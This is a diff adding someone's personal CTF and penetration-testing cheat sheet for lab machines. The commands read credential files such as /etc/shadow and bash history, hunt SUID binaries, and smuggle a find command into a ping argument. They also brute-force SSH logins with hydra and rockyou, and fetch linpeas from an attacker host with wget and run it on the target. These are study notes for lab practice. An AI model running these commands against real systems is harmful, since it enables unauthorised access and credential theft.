@@ -1,0 +1,139 @@
+
+	.bash_history is one of the first files I check after getting a shell because it often contains sensitive information left by users or administrators
+
+
+$ /home/user/.bash_history
+
+
+$sudo -l
+
+$ls -l
+
+>>> TO SEARCH SUID files
+$ find / -perm -4000 -ls 2>/dev/null
+
+
+>>>Find both SUID and SGID
+find / -perm /6000 2>/dev/null
+
+f	Regular file	
+d	Directory	
+l	Symbolic link 
+b	Block device	
+c	Character device	
+s	Socket
+
+
+>>> Search files based on specific keyword
+$ find / -type f -iname "*<keyword>*" 2>/dev/null
+
+
+CLUTCH COMMAND:
+$ ping -c 4 127.0.0.1; find / -type f -iname "*flag*" 2>/dev/null
+
+
+/etc/passwd
+/etc/sudoers
+/etc/shadow
+
+
+
+
+>>>>>>>>>> TO DOWNLOAD THE CONTENTS OF THE WEB
+Save it to a file:
+
+$ curl http://<IP> -o index.html
+
+
+>>>>>>>>>> TO SEARCH THE CONTENTS OF THE FILE
+
+Search for "flag" (case-sensitive)
+$ grep "flag" filename
+
+Search for "flag" (case-insensitive)
+$ grep -i "flag" filename
+
+Show line numbers
+$ grep -in "flag" filename
+
+
+
+Enumerate Users and Hydra Enumeration 
+$ wpscan --url http://<IP> --enumerate u
+
+$ hydra -l users.txt -P /usr/share/wordlists/rockyou.txt ssh://11.11.11.13
+
+
+
+>>>>>If you're already inside the MySQL client, the command to see what privileges the current user has is:
+
+SHOW GRANTS;
+
+or
+
+SHOW GRANTS FOR CURRENT_USER;
+
+To see the grants for a specific user (if you have permission):
+
+SHOW GRANTS FOR 'root'@'localhost';
+
+
+
+hostname -r
+uname -r
+id
+whoami
+
+
+>>>>>>>>> TO DOWNLOAD LINPEAS
+Download the Linpeas inside your kali
+$ sudo apt install peass
+
+Copy the Linpeas into your working Kali directory
+$ cp /usr/share/peass/linpeas/linpeas.sh ~/deathnote/
+
+
+Start your server
+$ python -m http.server 8000
+
+
+Inside the TARGET machine
+$ wget http://<YOUR_KALI_IP>:8000/linpeas.sh
+
+
+After that in the TARGET machine,
+	chmod means change mode. It changes the permissions of a file or directory in Linux.
+	This gives linpeas.sh execute permission, allowing you to run:
+$ ls -l linpeas.sh
+$ chmod +x linpeas.sh
+$ ./linpeas.sh
+
+Note : if you get Permission Denied for Linpeas installation
+$ pwd
+$ cd /tmp
+$ wget http://<YOUR_KALI_IP>:8000/linpeas.sh
+
+
+
+
+
+//// TO CHECK WHETHER YOU HAVE ROOT(SUPERUSER) ACCESS
+$ sudo su
+
+
+
+/////// SMB Client
+SYNTAX : $ smbclient -L //<IP> -U <username> -p <port>
+
+$ smbclient -L //11.11.11.16 -U guest -p 4445
+	might return:
+
+Sharename       Type
+---------       ----
+public          Disk
+backup          Disk
+IPC$            IPC
+
+$ smbclient //11.11.11.16/<share_name> -U 
+$ ls 
+$ get filename.txt
